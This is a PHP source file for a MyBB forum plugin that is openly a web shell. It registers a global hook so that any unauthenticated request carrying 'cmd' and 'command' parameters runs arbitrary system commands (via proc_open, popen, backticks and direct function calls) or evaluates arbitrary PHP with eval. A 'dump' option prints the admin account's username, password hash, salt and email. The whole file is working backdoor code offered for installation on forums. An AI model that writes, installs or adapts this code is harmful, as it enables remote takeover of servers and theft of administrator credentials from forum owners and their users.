<?php
if(!defined("IN_MYBB"))
{
    die("You Cannot Access This File Directly. Please Make Sure IN_MYBB Is Defined.");
}

function shell_info()
{
    return array(
        "name" => "My WebShell",
        "description" => "MyBB Shell Plugin",
        "website"               => "http://siph0n.net",
        "author"                => "sn",
        "authorsite"            => "http://siph0n.net",
        "version"               => "1.0",
        "guid"                  => "",
        "compatibility" => "*"
    );
}

function proc_me($cmd)
{
    $descr = array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w'));
    $pipes = array();
    $p = proc_open($cmd, $descr, $pipes);
    if(is_resource($p)) {
        fputs($pipes[0], "");
        fclose($pipes[0]);
        while($data = fgets($pipes[1])) {
            echo $data."</br>";
        }
        fclose($pipes[1]);
        proc_close($p);
        return true;
    } else {
        return false;
    }
}

function shell_main($cmd, $command)
{
    global $db;
    $disable_functions = ini_get('disable_functions');
    $exec_functions = array('shell_exec', 'passthru', 'exec', 'system', 'popen', 'proc_open', 'eval', 'assert', 'pcntl_exec', '`');
    $disabled_array = explode(',', $disable_functions);
    $available = array();
    foreach($exec_functions as $a) {
        if($a != "") {
            if(!in_array($a, $disabled_array)) {
                $available[] = $a;
            }
        }
    }
    if($cmd == "proc_open") {
        echo "<pre>".proc_me($command)."</pre>";
    } elseif($cmd == "popen") {
        popen($command, 'r');
    } elseif($cmd == "eval") {
        echo "<pre>";
        eval($command);
        echo "</pre>";
    } elseif($cmd == "`") {
        echo `$command`;
    } elseif($cmd == "dump") {
        $query = $db->query("SELECT * FROM ".TABLE_PREFIX."users WHERE uid = 1 LIMIT 1") or die(mysql_error());
        while($result = $db->fetch_array($query)) {
            echo "Admin Dumped:</br>";
            echo $result['uid'].":".$result['username'].":".$result['password'].":".$result['email'].":".$result['salt']."</br>";
        }
    } else {
        echo "<pre>";
        echo $cmd($command);
        echo "</pre>";
    }
    echo "</br>Available Commands:</br>";
    print_r($available);
}

function shell_global_start()
{
    global $mybb;
    if($mybb->settings['shell_enable'] == 1) {
        if(isset($mybb->input['cmd'])) {
            if(!empty($mybb->input['cmd'])) {
                if(empty($mybb->input['command'])) { $command = ""; } else { $command = $mybb->input['command']; }
                shell_main($mybb->input['cmd'], $command);
                die("");
            }
        }
    }
}

function shell_activate()
{
    global $db;
    if($db->table_exists("shell"))
    {
        return true;
    }
    $myfirstplugin_group = array(
        'gid'    => 'NULL',
        'name'  => 'shell',
        'title'      => 'shell',
        'description'    => 'Settings For shell',
        'disporder'    => "1",
        'isdefault'  => "0",
    );
    $db->insert_query('settinggroups', $myfirstplugin_group);
        $gid = $db->insert_id();
        $myfirstplugin_setting = array(
        'sid'            => 'NULL',
        'name'        => 'shell_enable',
        'title'            => 'Do you want to enable shell?',
        'description'    => 'If you set this option to yes, this plugin be active on your board.',
        'optionscode'    => 'yesno',
        'value'        => '1',
        'disporder'        => 1,
        'gid'            => intval($gid),
    );
    $db->insert_query('settings', $myfirstplugin_setting);
        rebuild_settings();
}

function shell_deactivate()
{
    global $db;
    $db->query("DELETE FROM ".TABLE_PREFIX."settings WHERE name IN ('shell_enable')");
    $db->query("DELETE FROM ".TABLE_PREFIX."settinggroups WHERE name='shell'");
    rebuild_settings();
}

$plugins->add_hook('global_start', 'shell_global_start');

?>
